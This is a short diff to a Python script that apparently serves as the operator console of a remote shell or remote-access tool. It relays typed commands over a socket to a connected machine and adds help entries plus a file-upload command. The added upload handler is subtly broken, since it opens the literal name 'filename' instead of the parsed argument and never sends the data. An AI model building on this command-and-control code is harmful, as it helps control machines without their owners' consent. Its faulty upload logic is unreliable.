@@ -40,6 +40,20 @@ while msg != 'exit':
             print('ps')
             print('connections')
             print('sys')
+            print('cd')
+            print('ls')
+            print('pwd')
+            print('user')
+            print('upload')
+            print('lcd')
+            print('lls')
+        elif msg == 'clear':
+            os.system('cls')
+        elif msg.startswith('upload'):
+            filename = msg.replace('upload ', '')
+            f = open('filename', 'rb')
+            fd = f.read()
+            f.close()
         else:
             c.send(msg.encode('ascii'))
             rb = c.recv(1000000)
